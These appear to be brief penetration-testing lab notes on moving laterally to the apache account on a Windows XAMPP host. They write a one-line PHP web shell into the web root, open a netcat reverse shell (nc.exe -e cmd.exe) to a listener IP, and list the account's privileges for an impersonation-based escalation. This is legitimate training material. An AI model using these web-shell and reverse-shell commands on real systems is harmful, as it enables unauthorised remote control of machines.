user cybergeek does not have privileges that allows privilege escalation\. lateral movement to switch to apache user

-  C:\\xampp\\htdocs\>echo "\<?php system\($\_GET\['cmd'\]\); ?\>" \> cmd\.php

-  send nc\.exe to victim machine
-  nc\.exe \-nv 192\.168\.45\.199 4411 \-e cmd\.exe

-  C:\\xampp\\htdocs\>whoami
whoami
craft\\apache

-  C:\\Users\>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

Privilege Name                Description                               State   
============================= ========================================= ========
SeTcbPrivilege                Act as part of the operating system       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
